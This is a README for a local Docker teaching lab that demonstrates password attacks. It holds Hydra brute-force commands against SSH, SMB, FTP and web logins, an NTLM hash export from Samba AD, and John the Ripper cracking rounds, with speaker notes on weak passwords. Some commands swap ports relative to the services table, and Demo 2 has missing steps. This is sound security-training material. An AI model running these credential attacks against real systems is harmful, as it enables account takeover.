# Hacking Lab Demo

A Docker Compose lab for demonstrating John the Ripper and Hydra against services with different authentication methods.

## Prerequisites

- Docker and Docker Compose
- rockyou password list

# Quick Start

```bash
gunzip rockyou.txt.gz
docker compose up -d
```

## Services

| Service | Protocol | Host Port | Credentials |
|---|---|---|---|
| Samba | SMB | 4450 | `alice` / `dragon` |
| SSH | SSH | 2222 | `admin` / `password123` |
| FTP | FTP | 21 | `ftpuser` / `letmein` |
| HTTP Basic Auth | HTTP | 8080 | `webadmin` / `dragon` |
| DVWA (Form Login) | HTTP | 8081 | `admin` / `password` |

## Accessing Services

- **SSH:** `ssh admin@localhost -p 2222`
- **FTP:** `ftp localhost 21`
- **Samba:** `smbclient -L //127.0.0.1 -p 4450 -U 'alice%dragon'`
- **HTTP Basic Auth:** open <http://localhost:8080> in a browser
- **DVWA:** open <http://localhost:8081> in a browser

## Cleanup

```bash
docker compose down -v
```

# Hydra Demo

## Password list attack SSH

**TODO**
```bash
hydra -l admin -P rockyou.txt ssh://127.0.0.1:2222
```

### Brute-force SMB

```bash
hydra -l alice -P rockyou.txt -s 4450 smb://127.0.0.1
```

### Brute-force attack on FTP

**TODO**
```bash
hydra -l ftpuser ftp://127.0.0.1
```

### Brute-force HTTP Basic Auth

**TODO**
```bash
hydra -l webadmin -P /usr/share/wordlists/rockyou.txt.gz 127.0.0.1:8081 http-get /
```

### Brute-force DVWA Login Form

First log in to DVWA at <http://localhost:8081> and click **Create / Reset Database**, then:

**TODO**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz \
  127.0.0.1:8080 http-get-form \
  "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSID=<session_id>;security=low"
```

> Replace `<session_id>` with a valid PHPSESSID from your browser.


# John The Ripper

Attention: Uses John Jumbo (not Core)!

| Demo                              | Question answered                                | Time   |
| --------------------------------- | ------------------------------------------------ | ------ |
| 1. Mode convergence           | Which mode wins fastest for which password type? | ~3 min |
| 2. Hash Algorithm Differences | Why does hash algorithm choice matter?           | ~1 min |

Between each demo, need to run `rm -f ~/.john/john.pot` so cached cracks don't pre-empt the next run.

## Export NTLM hashes from Samba AD

This lab uses Samba AD as the open-source Active Directory implementation. Export the live NTLM hashes directly from Samba's local `sam.ldb` database:

```bash
docker compose exec samba-ad export-ntlm-hashes > ntlm.hashes
cat ntlm.hashes
```

The exported hashes are already in John-compatible `LM:NTHASH` format.

## Demo 1: Mode convergence on NTLM hashes

NTLM is the format used for Windows AD password hashes, and it is fast to compute.

Setup: build the hash file. NTLM is `MD4(UTF-16LE(password))`.

```bash
python make_passwords.py
```

If you want hashes from the running AD instead of generating them from the shared demo user list, use the export command above.

### Round 1: Single mode only (`--single`)

Single mode; uses the username and account metadata with aggressive mangling rules.

```bash
rm -f ~/.john/john.pot
john --single --format=nt ntlm.hashes
john --show --format=nt ntlm.hashes
```

**Expected result:** Only `marc:Marc2024!` is cracked.

--> Speech Notes: "One out of five — and notice it's the one where the password is a variant of the username. 
Lesson one: don't base your password on your name."

### Round 2: Wordlist, no rules

Pure dictionary attack.

```bash
john --wordlist=rockyou.txt --format=nt ntlm.hashes
john --show --format=nt ntlm.hashes
```

**Expected result:** `alice:dragon` cracked, plus `marc` still shown from before.

"`dragon` is in the top 100 of rockyou — essentially free to crack.
Lesson two: if your password is in any public breach dump, it's already compromised."$

### Round 3: Wordlist + Jumbo rules

Rules engine — leet substitutions, appended years, capitalizations, the standard 90-ish transformations in the Jumbo ruleset.

```bash
john --wordlist=rockyou.txt --rules=Jumbo --format=nt ntlm.hashes
john --show --format=nt ntlm.hashes
```

**Expected result:** `bob:P@ssw0rd2024` now falls.

"`P@ssw0rd2024` looks 'strong' — mixed case, numbers, symbols, 12 characters. But it's a dictionary word with predictable substitutions, and the rules engine catches exactly that pattern."

### Round 4: Mask mode

"Now suppose we know the corporate password policy — say HR forces everyone to use 'Word + Year'. We encode that as a mask."

```bash
# ?u = upper, ?l = lower, ?d = digit
john --mask='?u?l?l?l?l?l?d?d?d?d' --format=nt ntlm.hashes
john --show --format=nt ntlm.hashes
```

**Expected result:** `carol:Winter2024` cracked. Mask narrows the keyspace to exactly `Uppercase + 5 lower + 4 digits` = 26 × 26⁵ × 10⁴ ≈ 3 billion candidates

"If the attacker knows anything about your policy — from HR leaks, support tickets, or OSINT — they can prune the search space drastically."

### Round 5: Incremental (brute force)

"Last resort: we give up on any structure and brute-force by character frequency. This is the slowest mode, but it's guaranteed to find anything within its keyspace if you let it run long enough."

```bash
john --incremental=Alnum --min-length=4 --max-length=4 --format=nt ntlm.hashes
john --show --format=nt ntlm.hashes
```

**Expected result:** `dave:xk7m` cracked.

"All five cracked."

## Demo 2: Protecting hashed passwords

Same weak password, different hash algorithm.

Generate a bcrypt hash of the same weak password

You'll see something like:

## Attempt the crack

```bash
rm -f ~/.john/john.pot
john --wordlist=rockyou.txt --rules=Single --format=bcrypt bcrypt.hashes
```

After 30s, press any key to show status.

```
0g 0:00:00:38  3/3 0g/s 18.5p/s 18.5c/s 18.5C/s ...
```

Now we're at ~20 guesses per second instead of 10 billion.